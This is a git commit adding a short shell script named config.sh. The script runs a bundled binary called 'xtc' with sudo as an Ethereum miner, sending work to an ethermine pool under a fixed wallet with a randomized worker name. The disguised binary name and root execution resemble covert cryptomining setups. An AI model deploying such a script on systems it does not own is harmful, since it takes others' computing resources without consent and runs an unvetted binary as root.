f12141551eb1b29a0f199837e35b7140e0083a36
Candralukman021 <87910473+Candralukman021@users.noreply.github.com>
2021-07-24 17:35:03 +0000

    Add files via upload

---
+++ config.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=asia1.ethermine.org:4444
+WALL=0x491fcd9921b694454fff2882836526177d4317a8
+WORK=$(echo $(shuf -i 1000-999999999 -n 1)-XTC)
+
+cd "$(dirname "$0")"
+
+chmod +x ./xtc && sudo ./xtc -pool $POOL -wal $WALL.$WORK -proto 3
